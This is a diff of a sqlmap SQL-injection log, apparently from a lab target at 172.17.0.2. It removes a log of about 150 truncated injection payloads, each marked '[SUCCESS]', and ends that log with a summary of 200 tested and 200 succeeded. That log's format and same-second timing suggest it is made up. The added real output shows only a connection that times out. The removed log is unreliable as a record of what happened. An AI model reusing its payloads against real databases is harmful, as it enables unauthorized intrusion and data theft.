@@ -1,156 +1,17 @@
-sqlmap/1.8.4 - automatic SQL injection and database takeover tool
-[*] starting @ 2026-06-29 16:52:26
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1',IIF(8783=7295,1,1/0
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') WHERE 6944=6944 AN
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" ORDER BY 1-- XPVu
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1");SELECT (CASE WHEN 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-3898")) AS LXPI WHERE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' (SELECT CHAR(67)||C
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")#dupdDn AS#hyIurFFT
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" WHERE 6161=6161 OR 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))) OR NOT 3002=3002
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1||(SELECT 0x53526867 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1%' OR 3376=(SELECT CO
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" AND 1664=2491 AND "
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))) OR NOT 6177=2641 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1) WHERE 7874=7874 OR 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")#PEZMNdHyHc AS#ldjF
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-6232') /*!30886OR 763
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-5799'))) OR EXTRACTVA
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')))#wPZFsKQr OR#LCMO
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))) AND 3325=(SELECT
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1 (SELECT#RAVqOfsgJm k
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1) /*!30873WHERE 2674=
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' HAVING 8015=9652-- 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1)) AS CAeq WHERE 5686
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'); SELECT ( CASE WHE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))) HAVING 6136=8480 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' OR ELT(4260=4260,SL
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')) AS dWOA WHERE 211
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1);SELECT CASE WHEN 90
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-9347')) OR MAKE_SET(9
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1)#PekWrtig AS#LMJSBVp
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')) AS MVMB WHERE 971
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' WHERE 9248=9248 OR 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1 rmuV,; SELECT ( CASE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1`) WHERE 5999=5999 AN
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1`) WHERE 1668=1668 OR
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-8280)) AS CqOd WHERE 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-1339') OR ELT(2599=25
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'#McINzkIBp AND#WkcYF
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))) oR Gtid_subsEt(c
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1`=`1`; SELECT ( CASE 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1)))/**/anD/**/3442=11
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-3536) /*!30303OR 4794
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-2334%' /*!30205OR 874
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1`#XUaLZbsakC WHERE#QT
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' OR 6047=(SELECT COU
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') AND CASE WHEN 6146
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1,( SELECT * FROM GENE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'/**/IN/**/BOOLEAN/**
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') RLIKE ( SELECT ( C
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-5444'))) /*!30499OR 4
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=(8914=8914#OYblEzaVKz 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-1529'))) OR 2914=CAST
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-4130)/**/ORDER/**/BY/
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') Or eXp(~(seLeCt * 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))) ANd UpdAtexmL(68
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1"#yxGhyCvadld AND#Rzt
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1`=`1`;SELECT (CASE WH
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1) AS qXOL WHERE 5226=
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1) HAVING 3370=3370-- 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")#ZBCeSUJABkWb AND#z
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') ORDER BY 2104#
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1") ORDER BY 3503#
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" AND 3738=9812
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))#HFMztf AS#yeExCJ r
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))) AND 6527=6527 AN
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1#bARGKIwZJMD WAITFOR#
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1 pROCedUrE AnaLySE(ex
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-6722") OR EXTRACTVALU
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'||(SELECT#ikirNwuu 0
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' /*!30578AND GTID_SU
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")) /*!30653AS IPfk W
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" WHERE 3447=3447 AND
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-3414 OR CASE WHEN 293
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1));CALL REGEXP_SUBSTR
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' (SELECT#FNSSNYRP CH
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))) AND 8391=(SELECT 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')) AS ptCD WHERE 227
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-4125' OR EXTRACTVALUE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' WHERE 6198=6198 AND
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')#AFctwGDPsw AS#PXEy
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))#ELAZglfXf AS#fbGEp
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" AND ( SELECT ( CASE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')) AS kxRg WHERE 721
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' /*!30133AND 7262=CO
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))) AND ELT(3511=3511
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))) AND ( SELECT ( CA
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-5574")) ORDER BY 1-- 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') AS clVB WHERE 8830
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1,(SELECT (CASE WHEN (
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' IN BOOLEAN MODE) AN
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'||(SELECT CHAR(82) C
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1") AS GwNW WHERE 1351
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1||(SELECT Uxzr FROM D
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'||(SELECT (CHR(85)||
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1))); IF(2969=2969) SE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') RLIKE (SELECT 7668
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' WHERE 9909=9909 RLI
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-3229') OR (SELECT (CA
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1` wheRe 1397=1397 AnD
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'));SELECT DBMS_PIPE.
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1';SELECT COUNT(*) FRO
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-7358")) OR 3431=(SELE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')) RLIKE (SELECT (CA
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1)) AND 1662=6440 AND 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1") /*!30642AND 9980=(
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') AND ( SELECT ( CAS
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")) Or jSON_kEYs((Sel
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1')) AND CASE WHEN 943
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') AND 4671=DBMS_PIPE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1`=`1`; SELECT * FROM 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1%'#oDbMryStWnO OR#YVQ
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1` WHERE 4373=4373 ORD
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")) OR 8749=LIKE(CHAR
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1"))) AND (SELECT (CAS
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" OR NOT 2732=2732-- 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1 /*!30549OR UPDATEXML
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-2611") aS dOwd WherE 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'||(SELECT#flaGblQjAE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1"))) AND (SELECT (CAS
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")) AS PZQv WHERE 576
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-6541 wHerE 1313=1313 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1` WHERE 4498=4498 AND
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1%' AND 1797=DBMS_UTIL
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-1677) AS qrKs WHERE 2
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1)) AS erQr WHERE 4510
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'#AoAdwTNas WHERE#UMn
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1) WHERE 8646=8646 AND
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))#QyLFysEiCb AS#Mwg
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1`)#OOyJjiYQOBH WHERE#
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1"))) /*!30334OR (SELE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-9717") AS XEgr WHERE 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-5469'))) OR ( SELECT 
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" WHERE 4684=4684 AND
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))) AND MAKE_SET(217
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1%' AND ELT(2045=6058,
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-3739"))) ORDER BY 241
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1") WHERE 6240=6240 RL
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-9016"))) OR CASE WHEN
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1 OR 8239=LIKE(CHAR(65
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-5012') /*!30158OR 543
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'))) AND 8391=(SELECT
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1" AND 1666=(SELECT (C
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1` WHERE 5319=5319 AND
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1' IN BOOLEAN MODE);SE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=-7033')) AS LZRj WHERE
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1'||(SELECT /*!308220x
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1")) AND 1067=5846
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1') AND EXTRACTVALUE(3
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1||(SELECT#BKMSyPiNxzi
-[SUCCESS] Payload injected: GET http://<HOST>/<PATH>?id=1") AS nPGx WHERE 2866
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] ending @ 2026-06-29 16:52:26
-[INFO] Total tested: 200 | Blocked: 0 | Succeeded: 200
+[*] starting @ 23:36:53 /2026-06-30/
+
+[23:36:53] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[23:36:54] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://172.17.0.2/login.php'. Do you want to follow? [Y/n] Y
+[23:36:54] [INFO] testing if the target URL content is stable
+you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
+[23:37:24] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
